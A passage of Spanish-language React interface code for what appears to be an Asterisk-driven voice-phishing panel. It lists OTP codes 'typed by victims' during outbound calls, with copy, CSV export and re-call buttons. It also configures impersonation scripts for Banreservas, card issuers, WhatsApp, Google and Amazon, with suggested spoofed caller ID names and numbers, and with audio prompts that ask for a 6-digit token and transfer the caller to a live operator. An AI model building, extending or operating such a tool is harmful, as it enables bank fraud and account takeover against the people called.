              <KeyRound className="w-5 h-5 text-emerald-400" />
              <span>Registro de Códigos OTP Producidos</span>
              <span className="px-2 py-0.5 text-xs font-mono font-bold bg-emerald-500/20 text-emerald-300 rounded-full border border-emerald-500/30">
                {otpRecords.length}
              </span>
            </h3>
            <p className="text-xs text-slate-400">
              Almacén en vivo de todos los códigos digitados por las víctimas en llamadas salientes.
            </p>
          </div>

          <div className="flex items-center gap-2">
            <button
              id="btn-refresh-otp-records"
              onClick={() => fetchCapturedOtps(true)}
              className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold bg-slate-900 hover:bg-slate-800 text-slate-300 border border-slate-800 transition-all cursor-pointer"
            >
              <RefreshCw className="w-3.5 h-3.5" />
              <span>Actualizar</span>
            </button>

            <button
              id="btn-export-otp-csv"
              onClick={handleExportCsv}
              disabled={otpRecords.length === 0}
              className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold bg-slate-900 hover:bg-slate-800 text-emerald-400 border border-slate-800 disabled:opacity-40 transition-all"
            >
              <Download className="w-3.5 h-3.5" />
              <span>Exportar CSV</span>
            </button>

            <button
              id="btn-clear-otp-history"
              onClick={handleClearHistory}
              disabled={otpRecords.length === 0}
              className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold bg-rose-500/10 hover:bg-rose-500/20 text-rose-300 border border-rose-500/30 disabled:opacity-40 transition-all"
            >
              <Trash2 className="w-3.5 h-3.5" />
              <span>Vaciar</span>
            </button>
          </div>
        </div>

        {/* OTP Table */}
        <div className="overflow-x-auto rounded-xl border border-slate-800">
          <table className="w-full text-left border-collapse text-xs">
            <thead>
              <tr className="bg-slate-900/80 border-b border-slate-800 text-slate-400 font-mono">
                <th className="p-3">Hora</th>
                <th className="p-3">Número Destino</th>
                <th className="p-3">Servicio</th>
                <th className="p-3">Código OTP Capturado</th>
                <th className="p-3">Decisión del Agente (Válido/Inválido)</th>
                <th className="p-3 text-right">Acciones</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-800/60">
              {otpRecords.length === 0 ? (
                <tr>
                  <td colSpan={6} className="p-8 text-center text-slate-500">
                    <KeyRound className="w-8 h-8 mx-auto mb-2 opacity-30" />
                    <span>No hay códigos OTP capturados todavía. Lanza tu primera llamada de producción.</span>
                  </td>
                </tr>
              ) : (
                otpRecords.map((record) => (
                  <tr key={record.id} className="hover:bg-slate-900/40 transition-colors">
                    <td className="p-3 text-slate-400 font-mono">{record.timestamp}</td>
                    <td className="p-3 font-mono font-bold text-white">{record.number}</td>
                    <td className="p-3 text-slate-300">{record.service || 'Banco / Antifraude'}</td>
                    <td className="p-3">
                      <span className="inline-flex items-center px-3 py-1 rounded-lg bg-emerald-500/20 border border-emerald-500/40 font-mono text-sm font-black text-emerald-300 tracking-wider">
                        {record.otp}
                      </span>
                    </td>
                    <td className="p-3">
                      <div className="space-y-1.5">
                        <div>
                          {record.status === 'valid' ? (
                            <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 font-bold border border-emerald-500/30 text-[10px]">
                              <CheckCircle className="w-3 h-3 text-emerald-400" />
                              <span>VÁLIDO (Aprobado)</span>
                            </span>
                          ) : record.status === 'invalid' ? (
                            <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full bg-rose-500/20 text-rose-300 font-bold border border-rose-500/30 text-[10px]">
                              <XCircle className="w-3 h-3 text-rose-400" />
                              <span>INVÁLIDO (Rechazado)</span>
                            </span>
                          ) : (
                            <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full bg-amber-500/20 text-amber-300 font-medium border border-amber-500/30 text-[10px]">
                              <Clock className="w-3 h-3 text-amber-400" />
                              <span>Pendiente Revisión</span>
                            </span>
                          )}
                        </div>

                        {/* Botones rápidos para que el agente marque el estado */}
                        <div className="flex items-center gap-1.5">
                          <button
                            type="button"
                            onClick={() => handleVerifyOtp('valid', record.otp, record.number, record.id)}
                            title="Marcar este código como Válido"
                            className={`px-2 py-0.5 rounded text-[10px] font-bold flex items-center gap-1 transition-all ${
                              record.status === 'valid'
                                ? 'bg-emerald-500 text-slate-950 ring-2 ring-emerald-400/50'
                                : 'bg-slate-800 hover:bg-emerald-500/20 text-emerald-300 border border-slate-700'
                            }`}
                          >
                            <Check className="w-3 h-3" />
                            <span>Válido</span>
                          </button>

                          <button
                            type="button"
                            onClick={() => handleVerifyOtp('invalid', record.otp, record.number, record.id)}
                            title="Marcar este código como Inválido"
                            className={`px-2 py-0.5 rounded text-[10px] font-bold flex items-center gap-1 transition-all ${
                              record.status === 'invalid'
                                ? 'bg-rose-500 text-white ring-2 ring-rose-400/50'
                                : 'bg-slate-800 hover:bg-rose-500/20 text-rose-300 border border-slate-700'
                            }`}
                          >
                            <XCircle className="w-3 h-3" />
                            <span>Inválido</span>
                          </button>
                        </div>
                      </div>
                    </td>
                    <td className="p-3 text-right">
                      <div className="inline-flex items-center gap-1.5">
                        <button
                          onClick={() => handleCopyOtp(record.otp, record.id)}
                          className="inline-flex items-center gap-1 px-2.5 py-1 rounded-md text-[11px] font-semibold bg-slate-800 hover:bg-slate-700 text-white transition-all"
                        >
                          {copiedId === record.id ? (
                            <Check className="w-3.5 h-3.5 text-emerald-400" />
                          ) : (
                            <Copy className="w-3.5 h-3.5 text-slate-400" />
                          )}
                          <span>{copiedId === record.id ? 'Copiado' : 'Copiar'}</span>
                        </button>

                        <button
                          onClick={() => {
                            setTargetNumber(record.number);
                            window.scrollTo({ top: 0, behavior: 'smooth' });
                          }}
                          className="inline-flex items-center gap-1 px-2.5 py-1 rounded-md text-[11px] font-semibold bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-300 transition-all"
                        >
                          <PhoneCall className="w-3.5 h-3.5" />
                          <span>Re-llamar</span>
                        </button>
                      </div>
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>

      {/* MODAL: SUBIDA / GRABACIÓN RÁPIDA DE AUDIO PARA LA CAMPAÑA */}
      {isQuickUploadOpen && (
        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-slate-900 border border-slate-700 rounded-2xl max-w-md w-full p-6 shadow-2xl space-y-5">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
              <div className="flex items-center gap-2">
                <FileAudio className="w-5 h-5 text-emerald-400" />
                <h3 className="font-bold text-white text-sm">
                  Cargar Nueva Locución para la Campaña
                </h3>
              </div>
              <button
                onClick={() => {
                  handleStopRecordingQuick();
                  setIsQuickUploadOpen(false);
                }}
                className="text-slate-400 hover:text-white p-1"
              >
                ✕
              </button>
            </div>

            <div className="space-y-4">
              {/* Asignación de ranura */}
              <div>
                <label className="text-xs font-semibold text-slate-300 block mb-1">
                  Ranura en la campaña actual ({serviceLabel})
                </label>
                <select
                  value={quickUploadSlot}
                  onChange={(e) => setQuickUploadSlot(e.target.value as keyof CampaignAudioConfig)}
                  className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-xl text-xs text-white"
                >
                  <option value="introAudioPath">1. Saludo / Alerta Inicial</option>
                  <option value="promptAudioPath">2. Solicitud de Código OTP</option>
                  <option value="agentAudioPath">3. Pre-Transferencia Press-1 (Asesor)</option>
                  <option value="successAudioPath">4. Confirmación / Éxito OTP</option>
                </select>
              </div>

              {/* Nombre de la locución */}
              <div>
                <label className="text-xs font-semibold text-slate-300 block mb-1">
                  Nombre descriptivo del audio
                </label>
                <input
                  type="text"
                  value={quickUploadName}
                  onChange={(e) => setQuickUploadName(e.target.value)}
                  placeholder="Ej: bienvenida_banco_urgente"
                  className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-xl text-xs text-white placeholder-slate-500 font-mono"
                />
              </div>

              {/* Opciones de carga: Archivo o Micrófono */}
              <div className="space-y-3 pt-1">
                <div className="text-xs font-semibold text-slate-300">Origen del audio:</div>

                {/* Subir archivo */}
                <div className="p-3 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
                  <div className="text-[11px] text-slate-400 flex items-center gap-1.5">
                    <UploadCloud className="w-3.5 h-3.5 text-emerald-400" />
                    <span>Seleccionar archivo (.wav, .mp3, .ogg)</span>
                  </div>
                  <input
                    type="file"
                    accept="audio/*"
                    onChange={(e) => {
                      const file = e.target.files?.[0];
                      if (file) {
                        setQuickUploadFile(file);
                        if (!quickUploadName) {
                          setQuickUploadName(file.name.replace(/\.[^/.]+$/, ''));
                        }
                        const reader = new FileReader();
                        reader.onloadend = () => {
                          setQuickUploadDataUrl(reader.result as string);
                        };
                        reader.readAsDataURL(file);
                      }
                    }}
                    className="block w-full text-xs text-slate-400 file:mr-3 file:py-1.5 file:px-3 file:rounded-lg file:border-0 file:text-xs file:font-semibold file:bg-slate-800 file:text-emerald-300 hover:file:bg-slate-700 cursor-pointer"
                  />
                </div>

                {/* Grabar con micrófono */}
                <div className="p-3 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
                  <div className="flex items-center justify-between">
                    <div className="text-[11px] text-slate-400 flex items-center gap-1.5">
                      <Mic className="w-3.5 h-3.5 text-rose-400" />
                      <span>Grabar locución con micrófono</span>
                    </div>
                    {isRecordingQuick && (
                      <span className="text-[10px] font-mono text-rose-400 font-bold animate-pulse">
                        ● Grabando ({quickRecordTime}s)
                      </span>
                    )}
                  </div>

                  {!isRecordingQuick ? (
                    <button
                      type="button"
                      onClick={handleStartRecordingQuick}
                      className="w-full py-2 rounded-lg bg-rose-500/20 hover:bg-rose-500/30 text-rose-300 text-xs font-semibold flex items-center justify-center gap-2 border border-rose-500/30 transition-all"
                    >
                      <Mic className="w-3.5 h-3.5" />
                      <span>Iniciar Grabación de Voz</span>
                    </button>
                  ) : (
                    <button
                      type="button"
                      onClick={handleStopRecordingQuick}
                      className="w-full py-2 rounded-lg bg-rose-600 hover:bg-rose-500 text-white text-xs font-semibold flex items-center justify-center gap-2 transition-all shadow-lg shadow-rose-600/30"
                    >
                      <Square className="w-3.5 h-3.5 fill-current" />
                      <span>Detener y Procesar ({quickRecordTime}s)</span>
                    </button>
                  )}
                </div>

                {/* Previsualización del audio cargado */}
                {quickUploadDataUrl && (
                  <div className="p-2.5 rounded-lg bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-between text-xs text-emerald-300">
                    <div className="flex items-center gap-2 truncate">
                      <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
                      <span className="truncate">Audio listo para procesar a Asterisk</span>
                    </div>
                    <button
                      type="button"
                      onClick={() => handleTogglePlayAudio(quickUploadDataUrl, 'preview_quick')}
                      className="p-1 rounded bg-emerald-500/20 text-emerald-200 hover:text-white"
                      title="Escuchar"
                    >
                      <Play className="w-3.5 h-3.5" />
                    </button>
                  </div>
                )}
              </div>

              <div className="text-[11px] text-slate-500 font-mono bg-slate-950 p-2.5 rounded-lg border border-slate-800/80">
                ⚡ Asterisk optimiza automáticamente este archivo a <strong>PCM 8000Hz 16-bit Mono</strong> para la mejor fidelidad telefónica.
              </div>
            </div>

            <div className="flex items-center justify-end gap-3 pt-2 border-t border-slate-800">
              <button
                type="button"
                onClick={() => {
                  handleStopRecordingQuick();
                  setIsQuickUploadOpen(false);
                }}
                className="px-4 py-2 rounded-xl text-xs font-semibold bg-slate-800 hover:bg-slate-700 text-slate-300 transition-all"
              >
                Cancelar
              </button>
              <button
                type="button"
                onClick={handleSaveQuickAudio}
                disabled={!quickUploadDataUrl || !quickUploadName.trim()}
                className="px-4 py-2 rounded-xl text-xs font-bold bg-emerald-500 hover:bg-emerald-400 text-black shadow-lg shadow-emerald-500/20 disabled:opacity-40 transition-all flex items-center gap-1.5"
              >
                <Check className="w-4 h-4" />
                <span>Asignar a la Campaña</span>
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Modal para Editar Guión / Entidad y Asignar sus 4 Audios Pregrabados */}
      {isEntityModalOpen && editingEntity && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4 overflow-y-auto">
          <div className="bg-slate-900 border border-slate-700 rounded-2xl w-full max-w-2xl overflow-hidden shadow-2xl space-y-4 my-8">
            {/* Header */}
            <div className="p-4 border-b border-slate-800 flex items-center justify-between bg-slate-950/60">
              <div className="flex items-center gap-2.5">
                <div className="p-2 rounded-xl bg-emerald-500/20 text-emerald-400 border border-emerald-500/30">
                  <Settings2 className="w-5 h-5" />
                </div>
                <div>
                  <h3 className="text-base font-bold text-white">Editar Guión y Asignación de Audios</h3>
                  <p className="text-xs text-slate-400">
                    Personaliza los nombres, Caller ID y las 4 locuciones pregrabadas de esta entidad
                  </p>
                </div>
              </div>
              <button
                type="button"
                onClick={() => {
                  setIsEntityModalOpen(false);
                  setEditingEntity(null);
                }}
                className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-400 hover:text-white transition-all"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            {/* Body */}
            <div className="p-5 space-y-5 max-h-[75vh] overflow-y-auto">
              {/* Bloque 1: Datos de la Entidad */}
              <div className="space-y-3">
                <h4 className="text-xs font-bold text-slate-200 uppercase tracking-wider flex items-center gap-1.5">
                  <Building2 className="w-3.5 h-3.5 text-emerald-400" />
                  <span>1. Identidad de la Simulación</span>
                </h4>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                  <div className="space-y-1">
                    <label className="text-xs font-semibold text-slate-300">Nombre de la Entidad / Banco</label>
                    <input
                      type="text"
                      value={editingEntity.name}
                      onChange={(e) => setEditingEntity({ ...editingEntity, name: e.target.value })}
                      placeholder="ej. Banco Banreservas"
                      className="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-xl text-xs text-white focus:outline-none focus:border-emerald-500"
                    />
                  </div>

                  <div className="space-y-1">
                    <label className="text-xs font-semibold text-slate-300">Subtítulo / Situación de Fraude</label>
                    <input
                      type="text"
                      value={editingEntity.subtitle}
                      onChange={(e) => setEditingEntity({ ...editingEntity, subtitle: e.target.value })}
                      placeholder="ej. Transferencia desconocida"
                      className="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-xl text-xs text-white focus:outline-none focus:border-emerald-500"
                    />
                  </div>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                  <div className="space-y-1">
                    <label className="text-xs font-semibold text-slate-300">Icono Representativo</label>
                    <select
                      value={editingEntity.icon}
                      onChange={(e) => setEditingEntity({ ...editingEntity, icon: e.target.value as any })}
                      className="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-xl text-xs text-white focus:outline-none focus:border-emerald-500"
                    >
                      <option value="building">Banco / Financiera (Edificio)</option>
                      <option value="card">Tarjeta de Crédito (Tarjeta)</option>
                      <option value="message">WhatsApp / Telegram (Mensaje)</option>
                      <option value="lock">Google / Apple ID (Seguridad)</option>
                      <option value="shopping">Amazon / Pedidos (Bolsa)</option>
                      <option value="sliders">Personalizado (Control)</option>
                    </select>
                  </div>

                  <div className="space-y-1">
                    <label className="text-xs font-semibold text-slate-300">Caller ID Name sugerido</label>
                    <input
                      type="text"
                      value={editingEntity.defaultCallerName || ''}
                      onChange={(e) => setEditingEntity({ ...editingEntity, defaultCallerName: e.target.value })}
                      placeholder="ej. BANRESERVAS"
                      className="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-xl text-xs text-white font-mono focus:outline-none focus:border-emerald-500"
                    />
                  </div>

                  <div className="space-y-1">
                    <label className="text-xs font-semibold text-slate-300">Caller ID Number sugerido</label>
                    <input
                      type="text"
                      value={editingEntity.defaultCallerNum || ''}
                      onChange={(e) => setEditingEntity({ ...editingEntity, defaultCallerNum: e.target.value })}
                      placeholder="ej. 8099602110"
                      className="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-xl text-xs text-white font-mono focus:outline-none focus:border-emerald-500"
                    />
                  </div>
                </div>
              </div>

              {/* Bloque 2: Asignación de los 4 Audios */}
              <div className="space-y-3 pt-3 border-t border-slate-800">
                <div className="flex items-center justify-between">
                  <h4 className="text-xs font-bold text-slate-200 uppercase tracking-wider flex items-center gap-1.5">
                    <Volume2 className="w-3.5 h-3.5 text-emerald-400" />
                    <span>2. Locuciones Pregrabadas Asignadas a este Guión</span>
                  </h4>
                  <span className="text-[11px] text-slate-400">Escucha con Play antes de guardar</span>
                </div>

                {/* 1. Saludo / Alerta Inicial */}
                <div className="p-3.5 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
                  <div className="flex items-center justify-between">
                    <div>
                      <div className="text-xs font-bold text-emerald-300 flex items-center gap-1.5">
                        <Volume2 className="w-3.5 h-3.5 text-emerald-400" />
                        <span>1. Saludo / Alerta Inicial (Intro)</span>
                      </div>
                      <div className="text-[11px] text-slate-400">
                        Lo que escucha el cliente inmediatamente al contestar la llamada.
                      </div>
                    </div>
                    <button
                      type="button"
                      onClick={() => handleTogglePlayAudio(editingEntity.introAudioPath, 'modal_intro')}
                      disabled={!editingEntity.introAudioPath}
                      className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 hover:text-white border border-slate-700 transition-all"
                      title="Reproducir audio"
                    >
                      {playingAudioKey === 'modal_intro' ? (
                        <Pause className="w-4 h-4 text-emerald-400 animate-pulse" />
                      ) : (
                        <Play className="w-4 h-4 text-slate-300" />
                      )}
                    </button>
                  </div>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                    <select
                      value={editingEntity.introAudioPath}
                      onChange={(e) => setEditingEntity({ ...editingEntity, introAudioPath: e.target.value })}
                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono focus:outline-none focus:border-emerald-500"
                    >
                      <option value="custom/banrearreglado">custom/banrearreglado (Banreservas Intro)</option>
                      <option value="custom/alerta_cargo_tarjeta">custom/alerta_cargo_tarjeta</option>
                      <option value="custom/alerta_migracion_whatsapp">custom/alerta_migracion_whatsapp</option>
                      <option value="custom/alerta_seguridad_google">custom/alerta_seguridad_google</option>
                      <option value="custom/alerta_compra_amazon">custom/alerta_compra_amazon</option>
                      {audios.map((a) => (
                        <option key={a.id} value={a.asteriskPath}>
                          {a.name} ({a.asteriskPath})
                        </option>
                      ))}
                    </select>
                    <input
                      type="text"
                      value={editingEntity.introAudioPath}
                      onChange={(e) => setEditingEntity({ ...editingEntity, introAudioPath: e.target.value })}
                      placeholder="Ruta personalizada (ej. custom/mi_audio)"
                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono focus:outline-none focus:border-emerald-500"
                    />
                  </div>
                </div>

                {/* 2. Solicitud OTP */}
                <div className="p-3.5 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
                  <div className="flex items-center justify-between">
                    <div>
                      <div className="text-xs font-bold text-purple-300 flex items-center gap-1.5">
                        <KeyRound className="w-3.5 h-3.5 text-purple-400" />
                        <span>2. Solicitud de Código OTP (Prompt)</span>
                      </div>
                      <div className="text-[11px] text-slate-400">
                        Locución que pide a la persona ingresar los dígitos de su código de seguridad.
                      </div>
                    </div>
                    <button
                      type="button"
                      onClick={() => handleTogglePlayAudio(editingEntity.promptAudioPath, 'modal_prompt')}
                      disabled={!editingEntity.promptAudioPath}
                      className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 hover:text-white border border-slate-700 transition-all"
                      title="Reproducir audio"
                    >
                      {playingAudioKey === 'modal_prompt' ? (
                        <Pause className="w-4 h-4 text-purple-400 animate-pulse" />
                      ) : (
                        <Play className="w-4 h-4 text-slate-300" />
                      )}
                    </button>
                  </div>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                    <select
                      value={editingEntity.promptAudioPath}
                      onChange={(e) => setEditingEntity({ ...editingEntity, promptAudioPath: e.target.value })}
                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono focus:outline-none focus:border-purple-500"
                    >
                      <option value="custom/prompt_otp_6_digitos">custom/prompt_otp_6_digitos ("Por favor digite su TOKEN de 6 dígitos") [RECOMENDADO]</option>
                      <option value="custom/digite_token_6_digitos">custom/digite_token_6_digitos ("Por favor digite su TOKEN de 6 dígitos")</option>
                      <option value="custom/solicitar_codigo_otp">custom/solicitar_codigo_otp (Estándar)</option>
                      <option value="custom/solicitar_otp_tarjeta">custom/solicitar_otp_tarjeta</option>
                      <option value="custom/solicitar_codigo_sms">custom/solicitar_codigo_sms</option>
                      <option value="custom/solicitar_codigo_google">custom/solicitar_codigo_google</option>
                      <option value="custom/solicitar_codigo_amazon">custom/solicitar_codigo_amazon</option>
                      {audios.map((a) => (
                        <option key={a.id} value={a.asteriskPath}>
                          {a.name} ({a.asteriskPath})
                        </option>
                      ))}
                    </select>
                    <input
                      type="text"
                      value={editingEntity.promptAudioPath}
                      onChange={(e) => setEditingEntity({ ...editingEntity, promptAudioPath: e.target.value })}
                      placeholder="Ruta personalizada (ej. custom/solicitar_otp)"
                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono focus:outline-none focus:border-purple-500"
                    />
                  </div>
                </div>

                {/* 3. Transferencia a Asesor (Opción 1) */}
                <div className="p-3.5 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
                  <div className="flex items-center justify-between">
                    <div>
                      <div className="text-xs font-bold text-sky-300 flex items-center gap-1.5">
                        <PhoneForwarded className="w-3.5 h-3.5 text-sky-400" />
                        <span>3. Transferencia a Asesor (Opción 1 - "Un momento por favor...")</span>
                      </div>
                      <div className="text-[11px] text-slate-400">
                        Audio reproducido cuando el cliente presiona 1 antes de conectar a tu softphone X-Lite ({agentExtension}).
                      </div>
                    </div>
                    <button
                      type="button"
                      onClick={() => handleTogglePlayAudio(editingEntity.agentAudioPath, 'modal_agent')}
                      disabled={!editingEntity.agentAudioPath}
                      className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 hover:text-white border border-slate-700 transition-all"
                      title="Reproducir audio"
                    >
                      {playingAudioKey === 'modal_agent' ? (
                        <Pause className="w-4 h-4 text-sky-400 animate-pulse" />
                      ) : (
                        <Play className="w-4 h-4 text-slate-300" />
                      )}
                    </button>
                  </div>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                    <select
                      value={editingEntity.agentAudioPath}
                      onChange={(e) => setEditingEntity({ ...editingEntity, agentAudioPath: e.target.value })}
                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono focus:outline-none focus:border-sky-500"
                    >
                      <option value="custom/conectar_asesor_banco">custom/conectar_asesor_banco ("Un momento, transfiriendo...")</option>
                      <option value="custom/conectar_asesor">custom/conectar_asesor</option>
                      <option value="custom/conectar_asesor_tarjetas">custom/conectar_asesor_tarjetas</option>
                      <option value="custom/conectar_soporte_tecnico">custom/conectar_soporte_tecnico</option>
                      <option value="custom/conectar_soporte_cuentas">custom/conectar_soporte_cuentas</option>
                      <option value="custom/conectar_soporte_pedidos">custom/conectar_soporte_pedidos</option>
                      {audios.map((a) => (
                        <option key={a.id} value={a.asteriskPath}>
                          {a.name} ({a.asteriskPath})
                        </option>
                      ))}
                    </select>
                    <input
                      type="text"
                      value={editingEntity.agentAudioPath}
                      onChange={(e) => setEditingEntity({ ...editingEntity, agentAudioPath: e.target.value })}
                      placeholder="Ruta personalizada (ej. custom/conectar_asesor)"
                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono focus:outline-none focus:border-sky-500"
                    />
                  </div>
                </div>

                {/* 4. Validación Exitosa */}
                <div className="p-3.5 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
                  <div className="flex items-center justify-between">
                    <div>
                      <div className="text-xs font-bold text-emerald-300 flex items-center gap-1.5">
                        <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
                        <span>4. Confirmación / Éxito OTP</span>
                      </div>
                      <div className="text-[11px] text-slate-400">
                        Mensaje final tras capturar o validar exitosamente el código.
                      </div>
                    </div>
                    <button
                      type="button"
                      onClick={() => handleTogglePlayAudio(editingEntity.successAudioPath, 'modal_success')}
                      disabled={!editingEntity.successAudioPath}
                      className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 hover:text-white border border-slate-700 transition-all"
                      title="Reproducir audio"
                    >
                      {playingAudioKey === 'modal_success' ? (
                        <Pause className="w-4 h-4 text-emerald-400 animate-pulse" />
                      ) : (
                        <Play className="w-4 h-4 text-slate-300" />
                      )}
                    </button>
                  </div>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                    <select
                      value={editingEntity.successAudioPath}
                      onChange={(e) => setEditingEntity({ ...editingEntity, successAudioPath: e.target.value })}
                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono focus:outline-none focus:border-emerald-500"
                    >
                      <option value="custom/operacion_bloqueada_exito">custom/operacion_bloqueada_exito</option>
                      <option value="custom/tarjeta_protegida">custom/tarjeta_protegida</option>
                      <option value="custom/verificacion_exitosa">custom/verificacion_exitosa</option>
                      <option value="custom/acceso_restringido_exito">custom/acceso_restringido_exito</option>
                      <option value="custom/pedido_cancelado_exito">custom/pedido_cancelado_exito</option>
                      <option value="auth-thankyou">auth-thankyou (Asterisk nativo)</option>
                      {audios.map((a) => (
                        <option key={a.id} value={a.asteriskPath}>
                          {a.name} ({a.asteriskPath})
                        </option>
                      ))}
                    </select>
                    <input
                      type="text"
                      value={editingEntity.successAudioPath}
                      onChange={(e) => setEditingEntity({ ...editingEntity, successAudioPath: e.target.value })}
                      placeholder="Ruta personalizada (ej. custom/exito)"
                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono focus:outline-none focus:border-emerald-500"
                    />
                  </div>
                </div>
              </div>
            </div>

            {/* Footer */}
            <div className="p-4 border-t border-slate-800 bg-slate-950/60 flex items-center justify-between gap-3">
              <div>
                {campaignEntities.length > 1 && (
                  confirmDeleteId === editingEntity.id ? (
                    <div className="flex items-center gap-2">
                      <span className="text-xs text-rose-400 font-bold">¿Seguro que deseas eliminar este guión?</span>
                      <button
                        type="button"
                        onClick={() => handleDeleteEntity(editingEntity.id)}
                        className="px-3 py-1.5 rounded-lg text-xs font-bold bg-rose-600 hover:bg-rose-500 text-white shadow transition-all"
                      >
                        Sí, eliminar
                      </button>
                      <button
                        type="button"
                        onClick={() => setConfirmDeleteId(null)}
                        className="px-2 py-1.5 rounded-lg text-xs bg-slate-800 hover:bg-slate-700 text-slate-300 transition-all"
                      >
                        Cancelar
                      </button>
                    </div>
                  ) : (
                    <button
                      type="button"
                      onClick={() => setConfirmDeleteId(editingEntity.id)}
                      className="px-3 py-2 rounded-xl text-xs font-semibold bg-rose-500/10 hover:bg-rose-500/20 text-rose-300 border border-rose-500/30 transition-all flex items-center gap-1.5"
                    >
                      <Trash2 className="w-3.5 h-3.5" />
                      <span>Eliminar este guión</span>
                    </button>
                  )
                )}
              </div>

              <div className="flex items-center gap-2">
                <button
                  type="button"
                  onClick={() => {
                    setIsEntityModalOpen(false);
                    setEditingEntity(null);
                  }}
                  className="px-4 py-2 rounded-xl text-xs font-semibold bg-slate-800 hover:bg-slate-700 text-slate-300 transition-all"
                >
                  Cancelar
                </button>
                <button
                  type="button"
                  onClick={() => handleSaveEntity(editingEntity)}
                  disabled={!editingEntity.name.trim()}
                  className="px-4 py-2 rounded-xl text-xs font-bold bg-emerald-500 hover:bg-emerald-400 text-black shadow-lg shadow-emerald-500/20 disabled:opacity-40 transition-all flex items-center gap-1.5"
                >
                  <Save className="w-4 h-4" />
                  <span>Guardar y Asignar a Asterisk</span>
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
